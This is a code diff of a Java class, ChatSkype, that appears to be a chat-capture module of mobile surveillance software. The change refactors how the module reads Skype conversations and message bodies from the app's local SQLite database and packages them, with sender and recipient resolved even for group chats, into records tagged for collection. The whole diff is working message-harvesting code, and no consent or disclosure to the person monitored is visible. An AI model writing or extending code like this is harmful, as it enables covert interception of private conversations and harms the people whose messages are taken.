@@ -126,7 +126,7 @@ public class ChatSkype extends SubModuleChat {
 
 				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
 				for (SkypeConversation sc : conversations) {
-					String peer = sc.peer;
+					String peer = sc.remote;
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + peer + " lastReadIndex: "
 								+ sc.lastReadIndex);
@@ -174,7 +174,7 @@ public class ChatSkype extends SubModuleChat {
 				SkypeConversation c = new SkypeConversation();
 				c.account = account;
 				c.id = cursor.getInt(0);
-				c.peer = cursor.getString(1);
+				c.remote = cursor.getString(1);
 				c.displayname = cursor.getString(2);
 				c.given = cursor.getString(3);
 				c.lastReadIndex = cursor.getInt(4);
@@ -188,7 +188,7 @@ public class ChatSkype extends SubModuleChat {
 		return conversations;
 	}
 
-	private long fetchMessages(GenericSqliteHelper helper, final SkypeConversation sc, long lastConvId) {
+	private long fetchMessages(GenericSqliteHelper helper, final SkypeConversation conversation, long lastConvId) {
 
 		// select author, body_xml from Messages where convo_id == 118 and id >=
 		// 101 and body_xml != ''
@@ -197,7 +197,7 @@ public class ChatSkype extends SubModuleChat {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
 			String[] projection = new String[] { "id", "author", "body_xml", "timestamp" };
-			String selection = "type == 61 and convo_id = " + sc.id + " and body_xml != '' and id > " + lastConvId ;
+			String selection = "type == 61 and convo_id = " + conversation.id + " and body_xml != '' and id > " + lastConvId;
 
 			RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -210,29 +210,55 @@ public class ChatSkype extends SubModuleChat {
 					long timestamp = cursor.getLong(3);
 					Date date = new Date(timestamp * 1000L);
 
-					boolean incoming = !(peer.equals(sc.account));
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cursor) sc.account: " + conversation.account + " conv.remote: " +conversation.remote + " peer: " + peer);
+					}
+					
+					boolean incoming = !(peer.equals(conversation.account));
+					boolean isGroup = groups.isGroup(conversation.remote);
+					
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
+					}
 
-					String from, to;
-					String fromDisplay, toDisplay;
+					String from, to = null;
+					String fromDisplay, toDisplay = null;
+					
+					from = incoming? peer: conversation.account;
+					fromDisplay = incoming? conversation.displayname : from;
+					
+					if (isGroup) {
+						to = groups.getGroupTo(peer, conversation.remote);
+						toDisplay = to;
+					}else{
+						to = incoming? conversation.account : conversation.remote;
+						toDisplay = incoming? conversation.account : conversation.displayname;
+					}
 
-					if (incoming) {
-						to = sc.account;
-						toDisplay = sc.account;
+					// se sc.peer e' gruppo si espande peer,sc.peer
+					// se e' incoming, from e' peer, to e' expand
+					// se a scrivere sono io, e' outgoing, quindi from =
+					// account, to = expand
+					// altrimenti e' incoming
+
+					/*if (incoming) {
 						from = peer;
 						fromDisplay = sc.displayname;
+
+						if (!isGroup) {
+							to = sc.account;
+							toDisplay = sc.account;
+						}
+
 					} else {
 						// outgoing
-						if (groups.isGroup(sc.peer)) {
-							to = groups.getGroupTo(peer, sc.peer);
-							toDisplay = to;
-						} else {
+						if (!isGroup) {
 							to = peer;
 							toDisplay = sc.displayname;
 						}
 						from = sc.account;
 						fromDisplay = from;
-												
-					}
+					}*/
 
 					if (!StringUtils.isEmpty(body)) {
 						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
